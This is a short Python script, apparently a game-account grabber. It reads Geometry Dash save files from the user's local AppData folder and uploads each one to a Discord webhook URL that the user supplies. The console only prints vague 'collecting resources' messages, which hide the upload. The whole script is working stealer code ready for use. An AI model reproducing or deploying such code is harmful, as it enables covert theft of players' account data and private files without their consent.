from dhooks import Webhook, File
import os
import time

try:
    hook = Webhook("") #import your webhook url

    # Construct the absolute paths to the files
    file_names = ["CCGameManager.dat", "CCGameManager2.dat", "CCLocalLevels.dat", "CCLocalLevels2.dat"]
    appdata_dir = os.path.join(os.path.expanduser("~"), "AppData", "Local", "GeometryDash")
    
    for file_name in file_names:
        file_path = os.path.join(appdata_dir, file_name)

        if os.path.exists(file_path):
            # Create a File object using the correct file path
            discordfile = File(file_path)

            # Send the file to the webhook
            hook.send("File sent: " + file_name, file=discordfile)
            print(f"collecting resources")
        else:
            print(f"resources not found")

except Exception as e:
    print("An error occurred:", e)

# Add a delay before exiting
time.sleep(5)  # Wait for 5 seconds before exiting